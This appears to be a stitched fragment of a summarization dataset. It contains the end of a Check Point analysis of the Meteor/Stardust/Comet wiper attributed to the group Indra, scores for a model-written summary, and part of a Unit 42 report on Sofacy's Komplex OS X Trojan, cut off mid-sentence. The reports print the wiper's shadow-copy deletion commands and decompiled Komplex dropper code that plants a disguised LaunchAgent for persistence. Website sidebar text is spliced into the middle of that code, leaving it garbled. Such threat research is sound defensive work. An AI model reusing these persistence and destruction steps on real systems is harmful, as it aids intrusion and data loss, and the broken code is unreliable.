actions to this same encrypted log file. These detailed debug logs make it easier to analyze the malicious binary and understand its workflow. Appendix C contains a helper script to decrypt the log file.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchConfiguration stepsThe malware next sets out to prevent the victim from stopping the ongoing infection. First, the machine is removed from the Active Directory domain by using WinAPI or WMI. This makes it harder to remotely push any remediation tools to the infected machines. Next, the malware proceeds to corrupt the computer\u2019s boot configuration: in versions of Windows prior to Windows 7, the malware overrides the c:\\boot. ini file; in Windows 7 and above, it deletes the BCD entries. Finally, the malware changes the password of the local users. In the files analyzed, all the passwords chosen by the actor have the same pattern: Aa153![random sequence] , for example Aa153!rHrrdOvpCj or Aa153!IRro3d2JYm .When all the above is said and done, the user will not recover access to their machine easily. At this stage the malware disables the Windows screen saver, then changes both the desktop wallpaper and the lock screen images to a custom image. These are the pair of identical JPEG and BMP images presenting the logo of Iran\u2019s Railways and the message similar to the one displayed on the platform boards of different railway stations in Iran:Something about this \u201clong delays due to cyber attacks\u201d message just tickles our fancy, and betrays a somewhat surrealistic sense of humor on the attackers\u2019 part. They could have written anything, but they chose that.\u201cLong delays due to cyber attacks. More information: 64411\u201d message on the desktop wallpaper set up by the malwareurl \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchWith the above done, the malware logs off all users and executes a small program \u2014 a \u201clocker\u201d \u2014 in a new thread. The path to the locker file named mssetup.exe is retrieved from the configuration. mssetup.exe will prevent the user from interacting with the machine by blocking inputs from the keyboard and mouse devices. Finally, before moving to its main cause \u2014 wiping the system \u2014 the malware creates a scheduled task that assures its own persistence in the system. The scheduled task will be executed every time the system starts.As an aside, there is an extra step that didn\u2019t take place in this specific attack; the malware is supposed to terminate all processes named in a processes_to_kill list specified in the configuration file. As it happens, the configurations used in the attacks against the Iranian targets did not contain this list, and so no processes were terminated. We will later show configuration files from previous attacks that did indeed use this feature.Wiper functionalityInternally, this part is called \"Prefix Suffix wiper\" . As its name suggests, the malware gets a list of prefixes and suffixes from the configuration file and wipes the files that are matched by this rule. Another string in the malware \u2014 \"Middle Wiper\" \u2014 was probably used by this malware in the past in order to wipe the files that contain some unique substrings.The wiping procedure itself is pretty simple. First, the malware goes over the files and directories from the paths_to_wipe config, fills them with zero-bytes instead of their real content, and then deletes them.After the wiping procedure, the malware tries to delete the shadow copies by running the following commands: vssadmin.exe delete shadows /all /quiet **and ** C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete . Finally, the malware enters an infinite loop where it sleeps based on the is_alive_loop_interval value from the configuration file and writes \"Meteor is still alive.\" to the log in every iteration.If all this rings familiar to you, it should; it\u2019s all straight out from the ransomware playbook \u2014 except this isn\u2019t ransomware, which requires delicate orchestration of public-key and private-key cryptography to make the machine ultimately recoverable; this is Nuke-it-From-Orbit-ware. It\u2019s a one-way trip.Connecting the files to the recent attacks against Iranian targetsOur analysis of the files aligns with the analysis conducted by Amnpardaz. The flow of the attack is almost identical; the files have similar structure, the same names and the same functionality. With that said, there are still some differences. For example, the update.bat script that we analyzed is not used by the earlier variants, which instead execute nti.exe \u2014 an MBR infector based on the one used by NotPetya. Another example is a slight difference between the configuration shown in the Amnpardaz report and the configuration that we analyzed. The minor differences are in the paths_to_wipe As we mentioned before, the text that is showed is identical to the text the attackers displayed on the train stations.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchOther pieces in the files we analyzed contain names and other artifacts from Iran Railways\u2019 internal network, including computer names and internal Active Directory object names. For example, the one month before being identified.Attacks Against Companies in SyriaHunting for more filesEquipped with the information gathered so far, we went for a hunt to find more samples. Specifically, to find whether the attack on the Iranian targets was the first time that the attackers utilized these tools. Our queries quickly yielded results \u2014 files that were uploaded to Virus Total by three different submitters located in Syria. The files seemed to belong to three separated incidents and were also contain multiple debug strings, which disclose the internal name of these versions of the wiper \u2014 Stardust and Comet . Out of these two versions, Comet is the older one, compiled back in September 2019. While we have the complete execution flow of the two attacks that utilized Stardust , we only have a partial view of the one where Comet was used. For this reason, we will focus more on the execution chain of Stardust .Unlike the recent attacks where the Batch files were used during early infections stages, these Stardust executions are based on multiple VBS scripts. What\u2019s more, these scripts contain valuable information \u2014 the identities of the attacks\u2019 targets.The execution flow of the attacks against the Syrian companies.The execution flows of both attacks leveled at Syria in which Stardust was deployed are very similar and thus they will be described together. The initial payload that runs on the victim\u2019s machine appears to be a VBS script resolve.vbs that extracts a password-protected RAR archive to the working folder C:\\\\Program Files\\\\Windows NT\\\\Accessories\\\\ . This RAR contains another RAR file and three other VBS files. Then, the resolve.vbs script runs the extracted scripts in the following order:1. The first script iterates over the installed programs and checks if Kaspersky Antivirus is installed. If so, it tries to uninstall it using hardcoded domain credentials. 2. The second script starts by checking if Kaspersky\u2019s avp.exe process is running, and if so it tries to remove the Kaspersky license. 3. The last script extracts the second-stage RAR archive and runs an executable file that the archive contains. This stage is the earlier mentioned Stardust variant of the wiper.During the execution of these scripts, several requests are made to a server in order to trace the different steps of the execution. These are GET requests to a URL with the following pattern, where C&C IP is different between the attacks.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point Researchurl IP>/progress.php?hn=&dt=&st=&rs=where:hn = the Host Name dt = the Current Date and Time st = the Current Step rs = the Kaspersky AV running informationEvolution of a WiperThe wiper was the final payload used in all four incidents. The different names \u2014 Meteor , Stardust or Comet , depending on the version \u2014 weren\u2019t the only difference between the variants. During the evolution of 3 generations, the attackers introduced several changes in the tool, some are more significant than others. Key changes between the different variants of the wiper are explained below.Comet is the earliest variant we have, and it might as well be the first to be created. Unlike Stardust and Meteor , it does reference and makes use of all the strings and features inside it. The others contained the artifacts, while the code itself did not utilize them. Comet has a Kill Switch based on values from the config file including the server IP, port, URL path, and a number of requests to perform before aborting. It tries to connect to the server and if it doesn\u2019t get a response, or the response status is not 200 OK it aborts. In addition, the oldest variant creates a user as an Administrator using NetUserAdd and NetLocalGroupAddMembers APIs. Then it disables the first logon animation, as well as the first logon Privacy Settings screen. Finally, it adds itself to the auto logon based on a path it has in its configuration.Unlike Meteor, Stardust and Comet do not override the boot. ini file during their attempts to corrupt the boot configuration. This feature, only relevant for Windows versions prior to Windows 7, only exists in the Meteor version. The earliest version, Comet, does not contain the ability to corrupt boot configurations at all.[boot loader]timeout=0default=multi(0)disk(10000000)rdisk(0)partition(1000000)\\WINDOWS[operating systems]multi(0)disk(10000000)rdisk(0)partition(1000000)\\WINDOWS=\"Microsoft Windows XP Professional\" /noexecute=optin /fastdetectThe content Meteor writes to boot. ini.Stardust and Comet use \u201cLock My PC 4\u201d, a tool that restricts unauthorized use which used to be publicly available. After running the Lock My PC program, they remove the \u201chkSm\u201d registry value to delete the generated lock password, then delete the uninstaller of the tool to make it harder to recover system functionality. This functionality is not used in Meteor , even though it has related artifacts.The configuration files used in the attacks against the Syrian targets utilized more fields than the configurations that were used against the Iranian targets. These fields include process_to_kill , paths_to_wipe , log_server_ip , and log_server_port . Their content sheds the light on the targets of these operations and indicates that the attacker had access to the targeted networks prior to deploying the final attack.The log_server_ip and log_server_port configuration fields are used by the Stardust wiper to send a Base64-encoded log file to the remote server. The request is sent via HTTP POST to the data.html resource on the server. The configs that we obtained contain different values for the servers, disclosing two IP addresses that were used by the attackers.Who are the targets?url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchMultiple artifacts that were inspected during the analysis of these two Stardust operations in Syria point to the targeted companies \u2014 Katerji Group and its related company Arfada Petroleum \u2014 both located in Syria. First, the names of these companies appear in the VBS files as the parameters for the commands they executed to disable the Kaspersky AV. Another indication is the paths listed under the paths_to_wipe field in both configurations. These paths contain a list of user names, including the domain administrators of these two companies.\"paths_to_wipe\": [[ ]\"c:\\\\\\\\Users\\\\\\\\administrator.ARFADA\\\\\\\\Desktop\",\"c:\\\\\\\\Users\\\\\\\\administrator.ARFADA\\\\\\\\Documents\",[ ]\"paths_to_wipe\": [[ ]\"c:\\\\\\\\Users\\\\\\\\administrator.KATERJIGROUP\\\\\\\\Desktop\",\"c:\\\\\\\\Users\\\\\\\\administrator.KATERJIGROUP\\\\\\\\Documents\",[ ]Meet IndraOur scrutiny revealed not only the attacks\u2019 targets, but also the identity of the group behind these operations \u2014 a group that calls itself \u201cIndra\u201d after the Hindu God of War. In fact, Indra did not try to hide that they are responsible for these operations, and left their signature in multiple places.The image that was displayed by the attackers on the victims\u2019 locked computers announces \u201cI am Indra\u201d and takes the responsibility for the attacks on Katerji group.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchWallpaper set up by the Indra actor on victims machines, taking responsibility for the attacks and blaming the Katerji Group for\u201csupporting terrorists\u201d and \u201ctrading souls\u201durl \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchIn addition, all samples of the wiper but Meteor , contain multiple occurrences of the string \u201cINDRA\u201d. It is used by the Comet variant as the username of a newly created Administrator account. On Stardust though, it serves as an inert artifact, and is not involved in execution.Indra takes responsibility for the attack in which it deployed \u201cComet\u201d.We wondered whether this Indra attack group has any online presence, and in fact, they do. They operate multiple social network accounts on different platforms, including Twitter, Facebook, Telegram, and Youtube. Among other information, the accounts contain the disclosure of the attacks on the aforementioned companies:INDRA string inside the Stardust wiperurl \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchIndra group Twitter account takes responsibility for the attacks on ArfadaSurveying this social network activity, one can get an idea of the group\u2019s political ideology and motive for the attack, and even hear about some of the group\u2019s previous operations.The title of INDRA\u2019s official twitter account states that they are \u201caiming to bring a stop to the horrors of QF and its murderous proxies in the region\u201d and they claim to be very focused on attacking different companies who allegedly cooperate with the Iranian regime, especially with the Quds-Force and Hezbollah. Their posts are all written in English or Arabic (both don\u2019t seem to be their native language), and most talk about opposing terror or offer document leaks from the various different companies that fell victim to the group\u2019s attacks due to suspected ties to the Iranian Quads Force.In their first message, posted September 2019, INDRA claims to have carried out a successful attack against the company Alfadelex, demolished their network, and leaked the customers\u2019 and employees\u2019 data. One of the pictures that were posted by Indra from the hack against Alfadelex shows a webcam photo of a person sitting in front of a computer as they were watching the image we found used by Comet on their screen (one can only imagine how they felt at that moment). Another image, displayed on Alfadelex\u2019s website, has the same background as the other images we found used in the attacks against Alfadelex, Katerji, and Arfada.This background image also appears as the cover photo of Indra\u2019s Twitter and Facebook accounts.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchA screenshot of the attack on Alfadelex posted in Indra\u2019s Twitter accounturl \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchPrevious Indra OperationsSumming up the social network activity of Indra, the actors claim to be responsible for the following attacks:September 2019: an attack against Alfadelex Trading, a currency exchange and money transfer services company located in Syria. January 2020: an attack against Cham Wings Airlines, a Syrian-based private airline company. February 2020 and April 2020: seizure of Afrada\u2019s and Katerji Group\u2019s network infrastructure. Both companies are situated in Syria as well.The infected computer displays the photograph we found from the attack on Alfadelexurl \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchNovember 2020: Indra threatens to attack the Syrian Banias Oil refinery, though it is not clear whether the threat was carried out.Around November 2020, all of Indra\u2019s accounts fell silent. We weren\u2019t able to find evidence of any additional operations until this latest one.Connecting Indra to the Attacks on Iranian TargetsThe series of attacks on Syrian targets in 2019 and 2020 bears multiple similarities to the campaigns against the Iranian networks. These are similarities in the tools, the Tactics, Techniques and Procedures (TTP), as well as in the highly targeted nature of the attack, and they make us believe that Indra is also responsible for the recent attacks in Iran.The attacks are all directed against Iranian-related targets, whether it is Iran Railways and Iran\u2019s Ministry of Roads in 2021, or Katerji, Arfada, Alfadelex, and other Syrian companies targeted in 2020 and 2019. Indra\u2019s tweets and posts make it clear that they are targeting entities that they believe have ties with Iran. The multi-layered execution flow in all the attacks we analyzed \u2014 including the recent attacks against Iranian targets \u2014 uses script files and archive files as their mean of delivery. The scripts themselves, although they are of different file types, had almost the same functionality. Execution flow relies on previous access and recon info about the targeted network. In case of Iranian intrusion, the attackers knew exactly which machines they need to leave unaffected in order to deliver their message publicly; furthermore, they had access to the railway\u2019s Active Directory server which they used to distribute the malicious files. Another indication for the reconnaissance done by Indra is the screenshot they took from Alfadelex\u2019s Web Camera, showing the office with an infected PC. The wiper is the final payload deployed on the computers of the victims in all the aforementioned attacks. Meteor, Stardust, and Comet are different versions of the same payload, and we do not have an indication that this tool was ever used by other threat actors. The actor behind the attacks we analyzed did not try to keep their attack a secret. They shared messages and displayed pictures announcing the attacks. In the attacks against the Iranian targets, these messages were displayed not only on affected computers but also on the platform boards.Unlike their previous operations, Indra did not publicly take responsibility for the attacks in Iran. This might be explained by the seriousness of the new attacks, as well as their impact. While the attacks we inspected in Syria were carried against private companies, the attacks against Iran Railways and the Ministry of Roads and Urbanization targeted official Iranian entities. Moreover, the attacks in Syria received little media attention, whereas the attacks against the Iranian government were covered extensively all over the world and reportedly caused the Iranians some amount of grief.ConclusionBy carrying out an analysis of this latest attack against Iran, we were able to reveal its convoluted execution flow as well as 2 additional variants of the final \u2018wiper\u2019 component. These tools, in turn, were used previously in attacks against Syrian companies, for which the threat actor Indra took responsibility officially on their social media accounts. While Indra chose not to take responsibility for this latest attack against Iran, the similarities above betray the connection.There are two lessons to be learned from this incident.First, anonymity is a one-way street. Once you sacrifice it to reap PR and obtain some sweet likes on Twitter, it is not so easily recovered. You can stop broadcasting your actions to the entire world and you might think that you\u2019ve gone under the radar, but The Internet Remembers, and given enough motivation, it will deanonymize you, even if you\u2019re a badass hacktivist threat actor.Second, that we should be more worried about attacks that are entirely possible but \u201cclearly aren\u2019t going to happen\u201d according to the calculus of prevailing common wisdom. With all the trouble caused by cybercrime, hacktivism, nation-state meddling and so forth and so on, the extent and sophistication of attacks in general is still a fraction of its complete potential; oftentimes, threat actors don\u2019t do X, Y, Z even though they perfectly well could, and we come to rely on this truancy like it were a law of nature.Cases like this, where said threat actors go ahead and do X, Y, Z, ought to raise our collective level of anxiety. As we said in the opening statement, this attack happened in Iran, but next month an equivalent attack could be launched by some other group targeting New York, and Berlin the month after that. Nothing prevents it, except threat actors\u2019 limited patience, motivation and resources, which ", "generated_text": "the report; analysis; cyber attacks; Iranian infrastructure; July 9; 10; the Ministry of Roads; the Railway Company; the Ministry of Roads; the Ministry of Roads; infrastructure; the attacks; the attackers; data; the malware; Meteor; Stardust; Comet; services; the network; Yara rules; the TTPs; this attack; Syrian; 2019-2020; the attacks; the underlying actor; Indra; the tools; Yara rules; ties; activity; the past; other governments; this attack.", "ref_text": "<START-1>The PDF describes an analysis by Check Point Research of recent cyberattacks against Iranian targets, including Iran's railway system and the Ministry of Roads and Urban Development. The attacks involved malicious software that displayed fake delay messages on station information boards and wiped systems. Check Point's investigation found similarities between these attacks and previous unclaimed attacks on Syrian companies in 2019-2020. All the attacks used a custom wiper malware dubbed Meteor, Stardust, or Comet in different versions. The PDF provides technical details on how the malware works to corrupt systems. The earlier attacks on Syrian companies were claimed by a group calling itself Indra. Indra has an online presence and claimed responsibility for attacks on Syrian companies it accused of ties to Iran's Quds Force. While Indra did not claim the recent Iran attacks, Check Point believes they are responsible based on similarities in target selection, tactics, and the custom malware used. The report concludes that non-state actors have the capability to conduct sophisticated and highly disruptive attacks previously assumed to be solely in the realm of state-sponsored groups. It warns that as non-state groups become more advanced, equivalent attacks could occur anywhere globally. <END-1>", "t5/keyword/hint_hit_precision": 0.34285714285714286, "t5/word/hint_hit_recall": 0.09278350515463918, "gpt3/lexical/rouge_rouge1": 0.47058823529411764, "gpt3/lexical/rouge_rouge2": 0.11214953271028037, "gpt3/lexical/rouge_rougeL": 0.21671826625386997, "gpt3/lexical/rouge_rougeLsum": 0.21671826625386997, "gpt3_generated_text": ["This report provides an in-depth analysis of cyber attacks on Iranian infrastructure that occurred on July 9th and 10th, targeting the Ministry of Roads and the Railway Company. The attackers, identified as the group \"Indra,\" deployed sophisticated malware tools such as Meteor, Stardust, and Comet, which were also used in previous attacks in Syria in 2019-2020. The tactics, techniques, and procedures (TTPs) used by Indra suggest a non-state sponsored actor with ties to hacktivist or cybercriminal groups. The article includes Yara rules and indicators of compromise for identifying the attackers' presence in targeted networks. This politically motivated attack highlights the vulnerability of critical infrastructure to non-state actors and the need for enhanced cybersecurity measures to prevent future incidents."]}, {"split_name": "val", "sample_id": "val_129", "prompt_text": "Extract the keywords: 6POSTED BY: Dani Creus, Tyler Halfpop and Robert Falcone on September 26, 2016 11:00 AMFILED IN: Unit 42 TAGGED: aerospace, Komplex, OS X, Sofacy, TrojanUnit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the \u2018Komplex\u2019 tag using the Palo Alto Networks AutoFocus threat intelligence platform.The Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy \u2013 the Carberp variant that Sofacy had used in previous attack campaigns on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.Komplex is a Trojan that the Sofacy group created to compromise individuals using OS X devices. The Trojan has multiple parts, first leading with a binder component that is responsible for saving a second payload and a decoy document to the system. We found three different versions of the Komplex binder, one that was created to run on x86, another on x64, and a third that contained binders for both x86 and x64 architectures. We found the following samples of the Komplex binder:1 bit executable x86_64 universal binary with 2 architecturesRegardless of architecture, these initial binders all save a second embedded Mach-O file to \u2018/tmp/content\u2019. This file is the Komplex dropper used in the next stage of installation and to maintain persistence. After saving the Komplex dropper, these binders would then save a legitimate decoy document to the system and open them using the \u2018Preview\u2019 application to minimize suspicion of any malicious activity. Figure 1 shows the main function found in one of the initial droppers that saves and opens a PDF decoy, as well as executes another executable file saved as \u2018/tmp/content\u2019.Get Updates Sign up to receive the latest news, cyber threat intelligence and research from Unit 42.Business EmailSubmitSelect a CategorySelect a MonthMORE \u21921 24The \u201cSafe\u201d Zone and Other Challenges to Japan\u2019s int _main(int arg0, int arg1) { Cybersecurity Governance Efforts var_28 = [[NSAutoreleasePool alloc] init]; posted by Mihoko Matsubara on September 28, var_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex 2016 var_40 = [NSString stringWithFormat:@\"%@/roskosmos_2015-2025.pdf\" var_48 = [NSString stringWithFormat:@\"SetFile -a E %@/roskosmos_2015-2025.pdf\" Highlights from Australia Cyber var_38]; Security Summit 2016 var_50 = [NSString stringWithFormat:@\"rm -rf %@/roskosmos_2015-2025.app\" var_58 = [NSString stringWithFormat:@\"open -a Preview.app %@/roskosmos_2015- posted by Cristina Salmastlian on September 28, 2025.pdf\", var_38]; 2016 [[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@\"/tmp/content\" atomically:0x1]; Confucius Says Malware Families system([var_50 UTF8String]); Get Further By Abusing Legitimate system(\"chmod 755 /tmp/content\"); Websites [[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 system([var_48 UTF8String]); posted by Micah Yates on September 28, 2016 var_70 = [[NSTask alloc] init]; [var_70 setLaunchPath:@\"/tmp/content\"]; The Cybersecurity Canon: Cyber [var_70 launch]; Operations and the Use of Force in system([var_58 UTF8String]); remove(*arg1); posted by Palo Alto Networks on September 27, Next-Gen Drive: Robert Megennis Ends Season With Strong Finish posted by Justin Hall on September 27, 2016Figure 1 Main function within the Komplex binderThe binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using the Preview application built into OS X. Figure 2 shows a portion of the 17 page decoy document. This document is titled \u201c\u041f\u0440\u043e\u0435\u043a\u0442 \u0424\u0435\u0434\u0435\u0440\u0430\u043b\u044c\u043d\u043e\u0439 \u043a\u043e\u0441\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0439 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0420\u043e\u0441\u0441\u0438\u0438 \u043d\u0430 2016 \u2013 2025 \u0433\u043e\u0434\u044b\u201d and describes the Russian Federal Space Program\u2019s projects between 2016 and 2025. We do not have detailed targeting information regarding the Sofacy group\u2019s attack campaign delivering Komplex at this time; however, based on theMORE \u2192contents of the decoy document, we believe that the target is likely associated with the aerospace industry.Figure 2 Decoy document opened by Komplex binder showing document regarding the RussianSpace ProgramThe Komplex dropper component is saved to the system as \u201c/tmp/content\u201d (SHA256: for installing a third executable to the system and setting up persistence for the third executable to launch each time the OS X operating system starts. This dropper also provided the basis for the name \u201cKomplex\u201d, which is seen in several folder paths that were included within the Mach-O file, such as \u201c/Users/kazak/Desktop/Project/komplex\u201d.The Komplex dropper is fairly straightforward from a functional perspective, as it contains all of its functionality within its \u201c_main\u201d function. The \u201c_main\u201d function (Figure 3) accesses data within three variables named \u2018_Payload_1\u2019, \u2018_Payload_2\u2019 and \u2018_Payload_3\u2019, and writes them to three files on the system.1 25int _main(int arg0, int arg1) { var_38 = [[NSAutoreleasePool alloc] init]; var_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c]; var_48 = [NSData dataWithBytes:_Payload_2 length:0x201]; var_50 = [NSData dataWithBytes:_Payload_3 length:0x4c]; system(\"mkdir -p /Users/Shared/.local/ &> /dev/null\"); system(\"mkdir -p ~/Library/LaunchAgents/ &> /dev/null\"); [var_40 writeToFile:@\"/Users/Shared/.local/kextd\" atomically:0x1 [var_48 writeToFile:@\"/Users/Shared/com.apple.updates.plist\" atomically:0x1]; [var_50 writeToFile:@\"/Users/Shared/start.sh\" atomically:0x1]; system(\"cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/ &>/dev/null\"); remove(\"/Users/Shared/com.apple.updates.plist\"); system(\"chmod 755 /Users/Shared/.local/kextd\"); system(\"chmod 755 /Users/Shared/start.sh\"); var_58 = [[NSTask alloc] init]; [var_58 setLaunchPath:@\"/Users/Shared/start.sh\"]; remove(\"/Users/Shared/start.sh\"); }Figure 3 Komplex Dropper\u2019s main function that drops three files to the system and runs a shellscriptThe \u201c_main\u201d function writes the data within \u2018_Payload_1\u2019, \u2018_Payload_2\u2019, and \u2018_Payload_3\u2019 plist entry into \u2018launchd\u2019 to automatically execute the Komplex payload each time the system starts. Figure 4 shows the contents of the \u2018start.sh\u2019 script that sets up persistence for thepayload.1 2#!/bin/sh launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plistFigure 4 Contents of the start.sh shell script that calls launchctlThe \u2018start.sh\u2019 script loads \u2018com.apple.updates.plist\u2019, which sets the properties of the Komplex payload that is executed from \u201c/Users/Shared/.local/kextd\u201d at system start up courtesy of the \u201cRunAtLoad\u201d parameter. Figure 5 shows the contents of the \u2018com.apple.updates.plist\u2019 file loaded into \u2018launchd\u2019.1 21<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"url\"> <plist version=\"1.0\"> <dict> <key>Label</key> <string>com.apple.updates</string> <key>ProgramArguments</key> <array> <string>/Users/Shared/.local/kextd</string> </array> <key>KeepAlive</key> <false/> <key>RunAtLoad</key> <true/> <key>StandardErrorPath</key> <string>/dev/null</string> <key>StandardOutPath</key> <string>/dev/null</string> </dict> </plist>Figure 5 Contents of the com.apple.updates.plist file showing how the dropper achievespersistenceThe ultimate purpose of the aforementioned components is to install and execute the Komplex payload. The dropper component saves the payload to \u201c/Users/Shared/.local/kextd\u201d (SHA256: executes the payload. The payload begins by conducting an anti-debugging check to see if it is being debugged before proceeding with executing its main functionality, which can be seen in the \u201cAmIBeingDebugged\u201d function in Figure 6. The \u201cAmIBeingDebugged\u201d function uses the \u201csysctl\u201d function to check to see if a specific \u201cP_TRACED\u201d flag is set, which signifies that the process is being debugged. A particularly interesting part of this function is that it is very similar to the function provided by Apple to its developers in a guide created in 2004 titled \u201cDetecting the Debugger\u201d. This is not the first time the Sofacy group\u2019s malware authors have obtained techniques from publicly available sources, as demonstrated in the use of the Office Test Persistence Method that they obtained from a blog posted in 2014.1 if ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 & 0xff) != 0x0) { rax = __assert_rtn(\"AmIBeingDebugged\", \"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm\", 0x21, \"junk == 0\" var_2C1 = (0x0 & 0x800) != 0x0 ? 0x1 : 0x0; if (**__stack_chk_guard == var_8) { rax = var_2C1 & 0x1 & 0xff; }Figure 6 The AmIBeingDebugged function used as an anti-analysis techniqueAfter determining that it is not running in a debugger, the payload performs an anti- analysis/sandbox check by issuing a GET request to Google, to check for Internet connectivity. The payload will sleep until it receives a response from the HTTP requests to Google, which means Komplex will only communicate to its C2 servers in Internet enabled environments. Figure 7 shows the \u201cconnectedToInternet\u201d function that confirms whether the payload is able to communicate with \u201curl\u201d before carrying out its functionality.1 if ([NSData dataWithContentsOfURL:[NSURL URLWithString:@\"url\"]] != 0x0) { rax = var_1 & 0x1 & 0xff; return rax; }Figure 7 The connectedToInternet function testing for an active Internet connectionAfter confirming an active Internet connection, the Komplex payload begins carrying out its main functionality. The Komplex payload uses an 11-byte XOR algorithm to decrypt strings used for configuration and within C2 communications, including the C2 domains themselves. Figure 8 shows a screenshot of Komplex\u2019s custom string decryption algorithm, along with the XOR key used to decrypt strings within the payload.Figure 8 11-byte XOR algorithm used by Komplex to decrypt configuration stringsThe algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload references using the associated variable names. The payload uses these decrypted strings for a variety of purposes, such as command parsing and C2 server locations.Decrypted String appleupdate[.]org, apple-iclouds[.]net, itunes- .xml .pdf, .htm, .zipMAC EXTENSIONSTable 1 Strings decrypted by Komplex and their referenced nameThe Komplex payload uses the SERVERS variable to obtain the location of its C2, which it communicates with using HTTP POST requests. The payload generates a URL to communicate with its C2 server that has the following structure:/<random path>/<random string>.<chosen extension>/?<random string>=<encrypted token>The <chosen extension> portion of the URL is chosen at random from the list of legitimate file extensions: .xml, .zip, .htm and .pdf. The <encrypted token> within the parameters of the URL is base64 encoded ciphertext created from the string \u2018h8sn3vq6kl\u2019. The ciphertext of the string is generated via a custom algorithm that uses a random 4-byte integer as a key that is modified by XOR with the static value 0xE150722. The payload also encrypts the data sent within the POST request using the same algorithm and encodes it using base64. Figure 9 below shows anexample HTTP POST sent from the payload to its C2 server.Figure 9 Beacon sent from Komplex to C2 containing system information within the HTTP POSTdataThe HTTP POST data in Figure 9 is comprised of information that the malware collects from the infected system. The system information sent to the C2 includes data such as the system version, username, and process list, which is gathered within a function named \u201cgetOsInfo\u201d within the \u201cInfoOS\u201d class (Figure 10).1 12int InfoOS::getOsInfo()() { var_38 = rdi; var_18 = [[NSProcessInfo processInfo] operatingSystemVersionString var_20 = NSUserName(); var_28 = InfoOS::getProcessList(); var_30 = operator new[](strlen(var_28) + 0x200); sprintf(var_30, \"Mac OS X - %s %s\\nUser name - %s\\n\\t\\t\\t\\t\\t\\tProcess list :\\n\\n%s\", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String }Figure 10 getOsInfo function within Komplex that gathers system information for C2 beaconThe Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the same custom algorithm used to encrypt the POST data. The Komplex payload will parse the C2 response for the following strings: \u201c[file]\u201d and \u201c[/file]\u201d, \u201cFileName=\u201d, \u201cPathToSave=\u201d, \u201cShell=\u201d, \u201cExecute\u201d, and \u201cDelete\u201d. The \u201cDelete\u201d action does nothing more than delete a file specified by \u2018PathToSave\u2019/\u2019FileName\u2019, whereas the \u201cExecute\u201d action involves running the following system commands before executing the specified file:1 2mkdir -p &lt;'PathToSave'&gt; &amp;&gt; /dev/null chmod 755 &lt;'PathToSave'&gt;/&lt;'FileName'&gt; &amp;&gt; /dev/nullThe payload will treat \u201c[file]\u201d and \u201c[/file]\u201d as delimiters that specify the data that the payload should write to a specified file, which allows the threat actor to download additional files to the system. Lastly, the payload can execute commands on the compromised system specified within the \u201cShell\u201d field, which the payload will execute and then send results back to the C2.Code OverlapsWhile reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth exploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog titled NEW MAC OS MALWARE EXPLOITS MACKEEPER. According to this blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable names and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network traffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data, command parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.The second code overlap ties the Komplex Trojan to Sofacy\u2019s Carberp variant, which we have analyzed in previous research efforts. Even though Komplex was created to run on OS X and Sofacy\u2019s Carberp variant was developed to run on Windows, they share many commonalities,including:Same URL generation logic using random path values, a random file extension and encrypted tokenSame file extensions used in C2 URL that are listed within the binaries in the same orderSame algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is modified using value 0xAA7D756 whereas Komplex uses 0xE150722)Very similar command handling, including parsing specifically for Execute, Delete, [file], [/file], FileName, and PathToSave.Checks for Internet connectivity by connecting to google.comUses an 11-byte XOR key to decrypt strings within the configurationIn addition to these common traits, we found a Sofacy Carberp variant (SHA256: TOKEN value of \u2018h8sn3vq6kl\u2019 within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the author of Sofacy\u2019s Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the C2 server application to handle cross-platform implants.Infrastructure OverlapWhile Komplex\u2019s C2 domain appleupdate[.]org does not appear to 